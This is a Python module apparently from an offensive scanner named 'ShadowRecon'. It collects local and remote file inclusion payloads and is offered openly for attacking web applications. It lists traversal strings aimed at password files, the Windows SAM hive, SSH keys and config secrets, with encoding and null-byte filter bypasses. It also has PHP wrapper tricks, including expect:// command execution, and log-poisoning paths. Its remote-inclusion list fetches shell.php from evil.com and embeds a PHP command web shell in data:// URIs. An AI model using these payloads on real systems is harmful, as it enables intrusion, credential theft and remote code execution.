"""
Advanced LFI/RFI Payloads for ShadowRecon v1.0
Developed by kernelpanic | A product of infosbios

Comprehensive Local and Remote File Inclusion payload collection
"""

class LFIPayloads:
    """Advanced LFI/RFI payload collection"""

    # Basic LFI payloads
    BASIC_LFI = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '../../../etc/shadow',
        '../../../etc/hosts',
        '../../../etc/motd',
        '../../../etc/issue',
        '../../../proc/version',
        '../../../proc/self/environ',
        '../../../proc/self/cmdline',
        '../../../proc/self/stat',
        '../../../proc/self/status',
    ]

    # Deep traversal payloads
    DEEP_TRAVERSAL = [
        '../../../../../../../../etc/passwd',
        '../../../../../../../../etc/shadow',
        '../../../../../../../../etc/hosts',
        '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam',
        '../../../../../../../../windows/win.ini',
        '../../../../../../../../windows/system32/drivers/etc/hosts',
    ]

    # Encoded traversal payloads
    ENCODED_TRAVERSAL = [
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ]

    # Double encoding
    DOUBLE_ENCODED = [
        '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
    ]

    # Filter bypass techniques
    BYPASS_FILTERS = [
        '....//....//....//etc/passwd',
        '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts',
        '..%00/../../../etc/passwd',
        '../../etc/passwd%00',
        '../../etc/passwd%00.jpg',
        '../../etc/passwd\x00',
        '../../etc/passwd\x00.png',
        '..//..//..//etc//passwd',
        '..\\..\\..\\etc\\passwd',
    ]

    # PHP wrapper payloads
    PHP_WRAPPERS = [
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=../index.php',
        'php://filter/convert.base64-encode/resource=../../index.php',
        'php://filter/read=string.rot13/resource=index.php',
        'php://filter/read=string.toupper/resource=index.php',
        'php://input',
        'php://stdin',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b',
        'expect://whoami',
        'zip://shell.jpg%23shell.php',
    ]

    # Log poisoning payloads
    LOG_POISONING = [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/httpd/access_log',
        '/var/log/httpd/error_log',
        '/proc/self/environ',
        '/proc/self/fd/0',
        '/proc/self/fd/1',
        '/proc/self/fd/2',
        'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex220101.log',
    ]

    # Remote File Inclusion payloads
    RFI_PAYLOADS = [
        'http://evil.com/shell.php',
        'https://evil.com/shell.php',
        'ftp://evil.com/shell.php',
        'http://evil.com/shell.txt',
        'https://pastebin.com/raw/xyz123',
        'http://evil.com/shell.php%00',
        'http://evil.com/shell.php?',
        'http://evil.com/shell.php%23',
        'data://text/plain,<?php system($_GET[cmd]);?>',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2b',
    ]

    # Platform-specific payloads
    WINDOWS_SPECIFIC = [
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        'C:\\windows\\system32\\config\\sam',
        'C:\\windows\\system32\\config\\system',
        'C:\\windows\\win.ini',
        'C:\\windows\\boot.ini',
        'C:\\inetpub\\wwwroot\\web.config',
        '\\windows\\system32\\drivers\\etc\\hosts',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    ]

    LINUX_SPECIFIC = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/group',
        '/etc/resolv.conf',
        '/etc/ssh/sshd_config',
        '/root/.bash_history',
        '/home/user/.bash_history',
        '/var/log/auth.log',
        '/var/log/syslog',
    ]

    # Interesting files to target
    INTERESTING_FILES = [
        'config.php',
        'configuration.php',
        'database.php',
        'db.php',
        'settings.php',
        'wp-config.php',
        '.env',
        '.htaccess',
        'web.config',
        'application.yml',
        'config.yml',
        'secrets.yml',
        'id_rsa',
        'id_dsa',
        'authorized_keys',
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Get all LFI/RFI payloads"""
        all_payloads = []
        all_payloads.extend(cls.BASIC_LFI)
        all_payloads.extend(cls.DEEP_TRAVERSAL)
        all_payloads.extend(cls.ENCODED_TRAVERSAL)
        all_payloads.extend(cls.DOUBLE_ENCODED)
        all_payloads.extend(cls.BYPASS_FILTERS)
        all_payloads.extend(cls.PHP_WRAPPERS)
        all_payloads.extend(cls.LOG_POISONING)
        all_payloads.extend(cls.RFI_PAYLOADS)
        all_payloads.extend(cls.WINDOWS_SPECIFIC)
        all_payloads.extend(cls.LINUX_SPECIFIC)
        return all_payloads

    @classmethod
    def get_platform_payloads(cls, platform: str) -> list:
        """Get platform-specific payloads"""
        if platform.lower() == 'windows':
            return cls.WINDOWS_SPECIFIC + cls.BASIC_LFI + cls.BYPASS_FILTERS
        elif platform.lower() == 'linux':
            return cls.LINUX_SPECIFIC + cls.BASIC_LFI + cls.PHP_WRAPPERS
        else:
            return cls.get_all_payloads()

    @classmethod
    def generate_traversal_payloads(cls, target_file: str, max_depth: int = 8) -> list:
        """Generate directory traversal payloads for specific file"""
        payloads = []

        # Unix-style traversal
        for depth in range(1, max_depth + 1):
            traversal = '../' * depth
            payloads.append(f"{traversal}{target_file}")

        # Windows-style traversal
        for depth in range(1, max_depth + 1):
            traversal = '..\\' * depth
            payloads.append(f"{traversal}{target_file.replace('/', '\\')}")

        return payloads
